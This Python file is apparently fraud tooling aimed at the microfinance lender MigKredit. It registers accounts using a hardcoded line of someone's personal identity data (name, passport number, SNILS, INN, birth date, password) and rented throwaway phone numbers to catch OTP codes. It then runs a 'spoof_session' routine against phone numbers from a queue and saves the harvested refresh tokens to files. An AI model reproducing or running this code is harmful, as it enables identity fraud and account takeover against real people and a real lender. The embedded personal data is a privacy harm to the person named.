import asyncio
import datetime
import logging
import re

from data_class import DataQueue
from mig_service import MigService
from mig_service_register import from_line_to_gos_user, MigServiceRegister
from sms_hub_service import SmsHubService

line = '79999871356:020768asC! | Пол: F | ФИО: Смирнова Дарья  Сергеевна | Дата рождения: 14-05-2001 | Место рождения: Город Москва | Телефон: +7(999)9871356 | Почта: None | СНИЛС: 179-896-559 77 | ИНН: 772174398274 | Постоянный адрес: None | Фактический адрес: None | Серия и номер паспорта: 4521 306198 | Дата выдачи: 27.05.2021 | Выдано: ГУ МВД РОССИИ ПО Г.МОСКВЕ | Код подразделения: 770107 | Сканы: нет |  Кредитный рейтинг: Низкий рейтинг |  Rate: 224'


class Checker:
    def __init__(self,
                 data_queue: DataQueue):
        self.number = None
        self.number_id = None
        self.sms_hub_client = SmsHubService()
        self.data_queue = data_queue

    async def get_number(self) -> (int, int):
        number_id, number = await self.sms_hub_client.get_new_number()
        self.number_id = number_id
        self.number = number
        return number_id, number

    async def register_on_mig(self) -> (int, int):
        number_id, number = self.number_id, self.number
        logging.warning(f'Started registering on {number}')
        user = from_line_to_gos_user(line=line)
        mig_service = MigServiceRegister(user=user)
        await mig_service.request_token()
        await mig_service.request_reg_1(number=number[1:])

        await mig_service.get_init()
        await mig_service.get_ucdb_id()
        await mig_service.get_couca_100()
        await mig_service.get_client_loyality()

        await mig_service.request_reg_2()
        await mig_service.get_couca_3_4_1()
        await mig_service.request_send_code()
        logging.warning(f'Sent code on {number}')
        try:
            code = await asyncio.wait_for(self.sms_hub_client.get_status_number(id=self.number_id),
                                          timeout=120)
            logging.warning(f'Got code on {number} : {code}')
        except asyncio.TimeoutError:
            logging.error('Timeout error on number')
            await self.sms_hub_client.resend_number(id=self.number_id)
            return await self.register_on_mig()
        if code is False:
            await self.sms_hub_client.close_number(id=number_id)
            await self.get_number()
            return await self.register_on_mig()

        pattern = re.compile(r"Конфиденциально. Ваш код подтверждения: (?P<code>\d+) ООО МФК МигКредит")
        match = pattern.match(code)
        if match is not None:
            code_otp = match.group('code')
            await mig_service.request_send_otp(code=code_otp)
            await mig_service.get_couca_3_5()
            await mig_service.request_send_work()
            await mig_service.get_couca_3_7()
            await mig_service.wait_for_final_status()
            logging.warning(f'Success registered {number}')
            await self.sms_hub_client.resend_number(id=number_id)
        else:
            return None, None

        return number_id, number

    async def checker_worker(self):
        await self.get_number()
        await self.register_on_mig()
        while True:
            number = await self.data_queue.get_data()
            if number is None:
                continue
            try:
                await self.check_number(number=number)
            except:
                continue

    async def check_code(self,
                         code: str,
                         number: str,
                         call_id: str,
                         mig_service: MigService):
        pattern = re.compile(r"Kod podtvershdeniya: (?P<code>\d+)")
        match = pattern.match(code)
        if match is not None:
            code_otp = match.group('code')
            logging.warning(f'Got code on {number} : {code_otp}')
            correct = await mig_service.spoof_session(number=number,
                                                      code=code_otp,
                                                      call_id=call_id)
            return correct
        else:
            logging.error(f'Dont got code on {number}: {code}')
            return False

    async def check_number(self,
                           number: str):
        mig_service = MigService(number=self.number,
                                 number_id=self.number_id)
        logging.warning(f'Started checking {number}')
        await mig_service.request_token()
        call_id = await mig_service.send_code()
        logging.warning(f'Сall id {number}:{call_id}')
        if call_id is False:
            logging.error('Call is false (limit), registering again with new number')
            await self.sms_hub_client.close_number(id=self.number_id)
            await self.get_number()
            await self.register_on_mig()
            return await self.check_number(number=number)

        if call_id == 0:
            logging.error('Call is 0, registering again')
            await self.register_on_mig()
            return await self.check_number(number=number)

        correct = False
        while correct is False:
            try:
                code = await asyncio.wait_for(self.sms_hub_client.get_status_number(id=self.number_id),
                                              timeout=60)
                logging.warning(f'Got code on {number} : {code}')
            except asyncio.TimeoutError:
                logging.error('Timeout error on number')
                await self.sms_hub_client.resend_number(id=self.number_id)
                return await self.check_number(number=number)
            if code is False:
                logging.error('Cant get code, number is finished')
                await self.sms_hub_client.close_number(id=self.number_id)
                await self.get_number()
                await self.register_on_mig()
                return await self.check_number(number=number)
            correct = await self.check_code(code=code,
                                            number=number,
                                            call_id=call_id,
                                            mig_service=mig_service)
            logging.warning(f'Result on {number} is {correct}')
            await self.sms_hub_client.resend_number(id=self.number_id)

        await asyncio.sleep(5)
        loyalty = await mig_service.check_loyalty_flag()
        if loyalty is True:
            logging.info(f'Good loyalty session: {number} - token: {mig_service.refresh_token}')
            with open('final.txt', 'a') as file:
                file.write(f'{number}:{mig_service.refresh_token}\n')
        elif loyalty is False:
            logging.info(f'Bad loyalty session: {number} - token: {mig_service.refresh_token}')
            with open('bad_final.txt', 'a') as file:
                file.write(f'{number}:{mig_service.refresh_token}\n')
        else:
            logging.info(f'No account session: {number} - token: {mig_service.refresh_token}')
